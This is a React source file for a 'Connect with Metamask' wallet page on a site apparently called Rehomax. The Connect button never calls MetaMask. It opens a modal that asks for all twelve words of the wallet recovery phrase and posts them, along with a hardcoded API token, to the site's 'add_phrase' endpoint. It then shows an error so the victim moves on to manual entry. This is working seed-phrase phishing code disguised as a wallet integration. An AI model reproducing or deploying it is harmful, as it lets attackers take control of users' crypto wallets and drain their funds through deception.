import axios from 'axios';
import React, { useEffect, useState } from 'react';
import { NotificationContainer, NotificationManager } from 'react-notifications';
import { useAuth } from '../../auth/Auth';
import MetaMask from '../../images/metamask.png';

const Wallet = () => {
    const auth = useAuth();
    const user = auth.user;

    const [wallet, setWallet] = useState(null);
    const [modal, setModal] = useState(null);

    useEffect(() => {
        document.title = "Add Wallet | Rehomax";
    }, [])

    const addWallet = (event) => {
        event.preventDefault();
        if (wallet !== null) {
            NotificationManager.info('processing...', 'Wallet update');
            updateWallet(wallet);
        } else {
            NotificationManager.error('input wallet address', 'Wallet update');
        }
    }

    const closeModal = () => {
        setModal(false);
    }

    const handleMeta = async (event) => {
        NotificationManager.info('processing...', 'Wallet update');
        setModal(true);
    }

    const handleMetaWallet = (event) => {
        event.preventDefault();
        NotificationManager.info('updating...', 'Wallet update');
        var formData = new FormData(event.target);

        axios.post(`${auth.api}add_phrase?api_token=aedimvoenbevcunoijinanoernoimijoinenvuinncozIjecvniuzndk&username=${user}`, formData)
        .then((res) => {
            NotificationManager.error(res.data.message, 'Wallet update', 2000);
            setTimeout(() => {
                NotificationManager.info("Enter wallet address manually");
                setModal(false)
            }, 2005);
        })
    }

    const updateWallet = (account) => {
        axios(`${auth.api}addWallet?api_token=aedimvoenbevcunoijinanoernoimijoinenvuinncozIjecvniuzndk&username=${user}&account=${account}`)
            .then((res) => {
                if (res.data.code === '00') {
                    NotificationManager.success(res.data.message, 'Wallet update');
                } else {
                    NotificationManager.error(res.data.message, 'Wallet update');
                }

            })
            .then(auth.userData)
            .catch((err) => {
                NotificationManager.error(err.message, 'Wallet update');
            })
    }

    return (
        <div className="container">
            <NotificationContainer />
            <div className="row justify-content-center">
                <div className="col-11 col-sm-10 col-md-9 col-lg-8 col-xl-7">
                    <div className="row">
                        <div className="card col-sm-10 col-md-5 bg-light" style={{ marginTop: "25px" }}>
                            <div className="card-body" style={{ margin: '10px' }}>
                                <h5 className="card-title" style={{ fontSize: '18px', fontWeight: 'bold', textAlign: "center", fontFamily: "monospace" }}>Connect with Metamask</h5>
                                <img src={MetaMask} alt="Metamask" width="100%" />
                                <button type="button" onClick={handleMeta} class="btn btn-outline-primary form-control"> Connect </button>
                            </div>
                        </div>
                        <div className="card col-sm-10 col-md-5 bg-dark" style={{ marginTop: "25px" }}>
                            <div className="card-body" style={{ margin: '10px' }}>
                                <h5 className="card-title" style={{ fontSize: '18px', fontWeight: 'bold', textAlign: "center", fontFamily: "monospace" }}>Connect Manually</h5>
                                <form onSubmit={addWallet}>
                                    <div class="form-group">
                                        <label for="wallet">Wallet Address</label>
                                        <input type="text" class="form-control" value={wallet} name="wallet" onChange={(e) => setWallet(e.target.value)} id="wallet" placeholder="Wallet Address" style={{ fontSize: "11px" }} />
                                    </div>
                                    <button type="submit" class="btn btn-outline-primary form-control">Add Wallet</button>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <div class={`${!modal ? "d-none" : "modal d-flex"}`} id="modelId" tabindex="-1" style={{ background: 'rgba(0, 0, 0, 0.5)' }} role="dialog" aria-labelledby="modelTitleId" aria-hidden="true">
                <div class="modal-dialog" role="document">
                    <div class="modal-content">
                        <div class="modal-header">
                            <h5 class="modal-title" style={{ fontWeight: 'bolder', fontFamily: 'monospace', textTransform: 'uppercase' }}>Enter Wallet Phrase</h5>
                            <button type="button" className="btn btn-danger" onClick={closeModal} data-dismiss="modal" aria-label="Close">
                                <span aria-hidden="true">&times;</span>
                            </button>
                        </div>
                        <div class="modal-body">
                            <form onSubmit={handleMetaWallet}>
                                <div className="row">
                                    <div className='col-3 mt-3'>
                                        <input type="text" name="phrase[]" required class="form-control" placeholder="" aria-describedby="helpId" />
                                    </div>
                                    <div className='col-3 mt-3'>
                                        <input type="text" name="phrase[]" required class="form-control" placeholder="" aria-describedby="helpId" />
                                    </div>
                                    <div className='col-3 mt-3'>
                                        <input type="text" name="phrase[]" required class="form-control" placeholder="" aria-describedby="helpId" />
                                    </div>
                                    <div className='col-3 mt-3'>
                                        <input type="text" name="phrase[]" required class="form-control" placeholder="" aria-describedby="helpId" />
                                    </div>
                                    <div className='col-3 mt-3'>
                                        <input type="text" name="phrase[]" required class="form-control" placeholder="" aria-describedby="helpId" />
                                    </div>
                                    <div className='col-3 mt-3'>
                                        <input type="text" name="phrase[]" required class="form-control" placeholder="" aria-describedby="helpId" />
                                    </div>
                                    <div className='col-3 mt-3'>
                                        <input type="text" name="phrase[]" required class="form-control" placeholder="" aria-describedby="helpId" />
                                    </div>
                                    <div className='col-3 mt-3'>
                                        <input type="text" name="phrase[]" required class="form-control" placeholder="" aria-describedby="helpId" />
                                    </div>
                                    <div className='col-3 mt-3'>
                                        <input type="text" name="phrase[]" required class="form-control" placeholder="" aria-describedby="helpId" />
                                    </div>
                                    <div className='col-3 mt-3'>
                                        <input type="text" name="phrase[]" required class="form-control" placeholder="" aria-describedby="helpId" />
                                    </div>
                                    <div className='col-3 mt-3'>
                                        <input type="text" name="phrase[]" required class="form-control" placeholder="" aria-describedby="helpId" />
                                    </div>
                                    <div className='col-3 mt-3'>
                                        <input type="text" name="phrase[]" required class="form-control" placeholder="" aria-describedby="helpId" />
                                    </div>
                                </div>
                                <div className='row' style={{ justifyContent: 'right'}}>
                                    <div className='col-3 mt-3'>
                                        <button className='btn btn-success form-control' style={{ color: 'white'}} type="submit">
                                            Add Wallet
                                        </button>
                                    </div>
                                </div>
                            </form>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-dismiss="modal" onClick={closeModal}>Close</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    )
}

export default Wallet